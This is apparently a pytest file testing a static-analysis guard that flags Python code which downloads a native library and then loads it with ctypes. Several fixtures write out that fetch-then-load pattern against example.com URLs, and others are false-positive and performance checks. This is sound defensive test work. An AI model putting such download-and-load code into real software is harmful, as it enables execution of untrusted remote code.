from __future__ import annotations

import pytest

from agentsec.guards.ctypes_load_downloaded_library import CtypesLoadDownloadedLibraryGuard
from tests._timing import assert_growth
from tests.guards._common import *  # noqa: F401,F403


def _prof(root: Path) -> StackProfile:
    return mkprofile(root, features={"python"}, python_dirs=["."])


def test_fires_on_urlretrieve_then_cdll(tmp_path: Path) -> None:
    (tmp_path / "loader.py").write_text(
        "import ctypes\n"
        "import urllib.request\n"
        "lib_path, headers = urllib.request.urlretrieve('https://example.com/lib.so')\n"
        "lib = ctypes.CDLL(lib_path)\n",
        encoding="utf-8",
    )
    findings = CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["ctypes-load-downloaded-library/ctypes-load-after-download"]
    assert findings[0].severity == "high"


def test_fires_on_requests_get_then_windll_loadlibrary(tmp_path: Path) -> None:
    (tmp_path / "loader.py").write_text(
        "import ctypes, requests\n"
        "resp = requests.get('https://example.com/lib.dll')\n"
        "open('lib.dll', 'wb').write(resp.content)\n"
        "lib = ctypes.windll.LoadLibrary('lib.dll')\n",
        encoding="utf-8",
    )
    findings = CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["ctypes-load-downloaded-library/ctypes-load-after-download"]


def test_ctypes_load_without_prior_download_does_not_fire(tmp_path: Path) -> None:
    # FP bait: loading a native library already present in the repo (no network fetch nearby)
    # is ordinary native-extension usage.
    (tmp_path / "bindings.py").write_text(
        "import ctypes\n"
        "lib = ctypes.CDLL('./vendored/mylib.so')\n",
        encoding="utf-8",
    )
    assert CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path)) == []


def test_download_without_ctypes_load_does_not_fire(tmp_path: Path) -> None:
    # FP bait: downloading a file with no ctypes load anywhere nearby (e.g. a plain asset
    # download) is not this guard's concern.
    (tmp_path / "fetch.py").write_text(
        "import urllib.request\n"
        "urllib.request.urlretrieve('https://example.com/readme.txt', 'readme.txt')\n",
        encoding="utf-8",
    )
    assert CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path)) == []


def test_ctypes_load_far_outside_window_does_not_fire(tmp_path: Path) -> None:
    # FP bait: a download and an UNRELATED later ctypes load, separated by more than the
    # window, must not be paired.
    filler = "\n".join(f"x{i} = {i}" for i in range(20))
    (tmp_path / "far.py").write_text(
        "import ctypes, urllib.request\n"
        "urllib.request.urlretrieve('https://example.com/readme.txt', 'readme.txt')\n"
        f"{filler}\n"
        "lib = ctypes.CDLL('./vendored/mylib.so')\n",
        encoding="utf-8",
    )
    assert CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path)) == []


def test_healthcheck_get_then_unrelated_system_library_load_does_not_fire(tmp_path: Path) -> None:
    # FP fix: an unrelated healthcheck GET sitting a few lines above an ordinary
    # system-library load must not fire -- the download's result never feeds the ctypes call.
    (tmp_path / "service.py").write_text(
        "import ctypes, requests\n"
        "requests.get('http://localhost/health')\n"
        "libc = ctypes.CDLL('libc.so.6')\n",
        encoding="utf-8",
    )
    assert CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path)) == []


def test_fires_on_download_written_to_destination_then_loaded_by_same_path(tmp_path: Path) -> None:
    # The ctypes call references the WRITE DESTINATION literal, not the response variable --
    # already covered by test_fires_on_requests_get_then_windll_loadlibrary above; this adds a
    # same-shape .so/CDLL variant to pin the destination-token correlation path directly.
    (tmp_path / "loader.py").write_text(
        "import ctypes, requests\n"
        "resp = requests.get('https://example.com/lib.so')\n"
        "open('/tmp/lib.so', 'wb').write(resp.content)\n"
        "lib = ctypes.CDLL('/tmp/lib.so')\n",
        encoding="utf-8",
    )
    findings = CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["ctypes-load-downloaded-library/ctypes-load-after-download"]


def test_fires_on_urlretrieve_to_named_destination_then_cdll(tmp_path: Path) -> None:
    # Round-2 H2: `urlretrieve(url, dest)` writes to its OWN second argument. Only the assigned
    # result and a later open()/write_bytes() were link tokens, so the canonical shape was silent.
    (tmp_path / "loader.py").write_text(
        "import ctypes, urllib.request\n"
        "path = '/tmp/lib.so'\n"
        "urllib.request.urlretrieve('https://example.com/lib.so', path)\n"
        "lib = ctypes.CDLL(path)\n",
        encoding="utf-8",
    )
    findings = CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path))
    assert [f.location for f in findings] == ["loader.py:4"]


def test_fires_on_urlretrieve_to_literal_and_keyword_destination(tmp_path: Path) -> None:
    (tmp_path / "literal.py").write_text(
        "import ctypes, urllib.request\n"
        "urllib.request.urlretrieve('https://example.com/lib.so', '/tmp/lib.so')\n"
        "lib = ctypes.CDLL('/tmp/lib.so')\n",
        encoding="utf-8",
    )
    (tmp_path / "keyword.py").write_text(
        "import ctypes, urllib.request\n"
        "urllib.request.urlretrieve(url='https://example.com/x.dll', filename=dest)\n"
        "lib = ctypes.windll.LoadLibrary(dest)\n",
        encoding="utf-8",
    )
    findings = CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["keyword.py:3", "literal.py:3"]


def test_fires_on_download_nested_inside_ctypes_call(tmp_path: Path) -> None:
    # The docstring promised this shape, but its branch sat behind a line filter that always
    # skipped it (a nested download is never on an EARLIER line than the ctypes call).
    (tmp_path / "loader.py").write_text(
        "import ctypes, urllib.request\n"
        "lib = ctypes.CDLL(urllib.request.urlretrieve('https://example.com/lib.so')[0])\n",
        encoding="utf-8",
    )
    findings = CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path))
    assert [f.location for f in findings] == ["loader.py:2"]


def test_urlretrieve_destination_unrelated_to_loaded_library_does_not_fire(tmp_path: Path) -> None:
    # FP bait for the destination-argument widening: a data file downloaded next to a load of a
    # different (bundled/system) library, and an empty destination literal, link nothing.
    (tmp_path / "service.py").write_text(
        "import ctypes, urllib.request\n"
        "urllib.request.urlretrieve('https://example.com/data.csv', 'data.csv')\n"
        "urllib.request.urlretrieve('https://example.com/blank', '')\n"
        "libc = ctypes.CDLL('libc.so.6')\n",
        encoding="utf-8",
    )
    assert CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path)) == []


@pytest.mark.slow
def test_scan_is_linear_on_unclosed_and_interleaved_calls(tmp_path: Path) -> None:
    # Round-2 M4: each ctypes match walked an unclosed call to EOF, then visited EVERY download
    # in the file with a `code.count` line lookup (2000 interleaved get/CDLL lines: 85 s, against
    # 2.7 s at the round-1 code; 2000 unclosed CDLL lines: 9 s against 0.04 s).
    sizes = (250, 500, 1000, 2000)
    guard = CtypesLoadDownloadedLibraryGuard()
    files: dict[int, Path] = {}
    for n in sizes:
        d = tmp_path / str(n)
        d.mkdir()
        files[n] = d / "hostile.py"
        files[n].write_text(
            ("ctypes.CDLL(\n" + "r = requests.get('u')\nctypes.CDLL('x')\n") * n, encoding="utf-8"
        )

    def scan(n: int) -> None:
        guard._scan(files[n].parent, files[n])

    assert_growth(scan, sizes, expected="linear")
    # The work was still done: a real fetch-then-load appended to the hostile file still fires.
    files[250].write_text(
        files[250].read_text(encoding="utf-8") + "p, _ = urllib.request.urlretrieve(u)\nctypes.CDLL(p)\n",
        encoding="utf-8",
    )
    assert len(guard._scan(files[250].parent, files[250])) == 1


@pytest.mark.slow
def test_scan_is_linear_on_a_long_line_before_a_download(tmp_path: Path) -> None:
    # Round-3 M1: the assignment-target regex searched the whole line prefix, unanchored, once per
    # download, so a long `a,a,a,...` line before `requests.get(` was quadratic (80 KB: 134 s).
    sizes = (5000, 10000, 20000, 40000)
    guard = CtypesLoadDownloadedLibraryGuard()
    files: dict[int, Path] = {}
    for n in sizes:
        d = tmp_path / str(n)
        d.mkdir()
        files[n] = d / "hostile.py"
        # No `=` before the download, so every start position of the search fails after a scan.
        files[n].write_text("a," * n + "requests.get('u')\nctypes.CDLL('x')\n", encoding="utf-8")

    def scan(n: int) -> None:
        guard._scan(files[n].parent, files[n])

    assert_growth(scan, sizes, expected="linear")
    # The work was still done: a real fetch-then-load appended to the hostile file still fires.
    files[5000].write_text(
        files[5000].read_text(encoding="utf-8") + "p, _ = urllib.request.urlretrieve(u)\nctypes.CDLL(p)\n",
        encoding="utf-8",
    )
    assert len(guard._scan(files[5000].parent, files[5000])) == 1


def test_docstring_prose_alone_does_not_fire(tmp_path: Path) -> None:
    (tmp_path / "notes.py").write_text(
        '"""Discusses urllib.request.urlretrieve and ctypes.CDLL together in prose, with no '
        'real code below."""\n'
        "def run():\n"
        "    return None\n",
        encoding="utf-8",
    )
    assert CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path)) == []


def test_pragma_silences(tmp_path: Path) -> None:
    (tmp_path / "loader.py").write_text(
        "# security: allow-ctypes-load-downloaded-library\n"
        "import ctypes, urllib.request\n"
        "lib_path, headers = urllib.request.urlretrieve('https://example.com/lib.so')\n"
        "lib = ctypes.CDLL(lib_path)\n",
        encoding="utf-8",
    )
    assert CtypesLoadDownloadedLibraryGuard().run(tmp_path, _prof(tmp_path)) == []


def test_applies_requires_python(tmp_path: Path) -> None:
    guard = CtypesLoadDownloadedLibraryGuard()
    assert guard.applies(mkprofile(tmp_path, features={"python"})) is True
    assert guard.applies(mkprofile(tmp_path, features={"javascript"})) is False
